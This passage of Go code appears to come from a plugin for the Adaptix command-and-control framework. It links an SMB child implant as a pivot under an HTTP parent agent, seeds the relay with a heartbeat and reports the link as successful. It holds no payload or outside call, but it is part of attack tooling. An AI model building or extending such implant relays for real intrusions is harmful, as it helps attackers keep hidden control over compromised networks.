	PivotChildMap.Store(childId, childUUID)

	// Register the pivot relationship so Adaptix calls PivotPackData when the
	// child has tasks, which causes the HTTP parent to relay them via CMD_PIVOT.
	if err := ModuleObject.ts.TsPivotCreate(childUUID, parentData.Id, childId, "", false); err != nil {
		fmt.Printf("[Pain] TsPivotCreate warning (non-fatal): %v\n", err)
	}

	// Seed the relay cycle: inject the first heartbeat so TsTasksPivotExists
	// returns true on the parent's next HTTP poll, triggering extractPivotTasks.
	injectHeartbeat(childId)

	fmt.Printf("[Pain] linked SMB child %s via parent agent %d (child id=%d)\n",
		string(uid), parentData.Id, childId)

	ModuleObject.ts.TsTaskUpdate(parentData.Id, ax.TaskData{
		Type:        TYPE_TASK,
		AgentId:     parentData.Id,
		TaskId:      taskId,
		MessageType: MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
		ClearText:   fmt.Sprintf("linked SMB child: %s", string(uid)),
	})

	return nil
}
